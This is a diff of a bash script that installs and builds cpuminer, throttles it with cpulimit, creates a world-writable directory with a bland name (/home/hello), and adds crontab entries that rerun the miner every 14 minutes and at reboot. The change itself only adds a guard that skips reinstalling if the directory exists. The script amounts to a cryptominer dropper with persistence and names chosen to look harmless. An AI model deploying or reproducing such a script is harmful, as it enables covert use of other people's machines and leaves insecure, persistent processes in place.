@@ -1,5 +1,6 @@
 #!/bin/bash
-sudo apt-get update && apt-get -y upgrade
+ if [ ! -d /home/hello ]; then
+ sudo apt-get update && apt-get -y upgrade
 sudo apt-get install -y git make curl unzip gedit automake autoconf dh-autoreconf build-essential pkg-config openssh-server screen libtool libcurl4-openssl-dev libncurses5-dev libudev-dev libjansson-dev libssl-dev libgmp-dev gcc g++ screen cpulimit
 sudo mkdir /home/hello
 sudo chmod 777 /home/hello
@@ -18,3 +19,8 @@ sudo echo -e "cpulimit --exe cpuminer --limit $cpult -b &&  cd /home/hello/cpumi
 chmod 755 /home/hello/hi.sh
 chmod 755 /home/hello/hi2.sh
 (crontab -l ; echo -e "*/14 * * * * /home/hello/hi2.sh\\n@reboot /home/hello/hi.sh") | crontab -
+  else
+    echo 'hello2'
+  fi
+
+
